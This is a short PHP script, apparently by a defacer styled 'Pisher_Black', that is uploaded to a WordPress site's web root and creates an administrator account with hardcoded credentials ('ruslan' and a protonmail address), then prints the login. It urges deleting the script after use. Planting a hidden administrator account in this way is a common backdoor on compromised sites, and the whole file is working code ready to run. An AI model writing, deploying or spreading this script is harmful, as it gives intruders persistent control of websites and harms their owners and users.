<?php
// Admin User Auto Add Coded By Pisher_Black
// Don't Forget to remove this script after user add ! 
// Put this file in your Wordpress /Public_html Directory and run it from your browser \!/


require_once('wp-blog-header.php');
require_once('wp-includes/registration.php');

// Change this , you are free to put the logins you want ^_^
$newusername = 'ruslan';
$newpassword = 'packruslan@#';
$newemail = 'pepesikan@protonmail.com';

// Set The Configs vars
if ( $newpassword != 'YOURPASSWORD' && $newemail != 'YOUREMAIL@TEST.com' && $newusername !='YOURUSERNAME'  )  
{
	// Check that the user doesn't exist already
	if ( !username_exists($newusername) && !email_exists($newemail) ) 
	{
		// Create the admin user and set the role to Administrator
		$user_id = wp_create_user( $newusername, $newpassword, $newemail);
		if ( is_int($user_id) )
		{
			$wp_user_object = new WP_User($user_id);
			$wp_user_object->set_role('administrator');
			echo 'Successfully created new admin user. Now delete this script ^_^ and dont be lazy !  new user:ruslan and new pass:packruslan@#';
		} 
		else {
			echo 'Error with wp_insert_user. No users were created , you are drunk man xD go watch cartoon !';
		}
	} 
	else {
		echo 'This user or email already exists , you are drunk man xD put glasses °_° !';
	}
} 
else {
	echo "You didn't set a password, username, or email inside the script before running the script , you drunk man xD !";
}

?>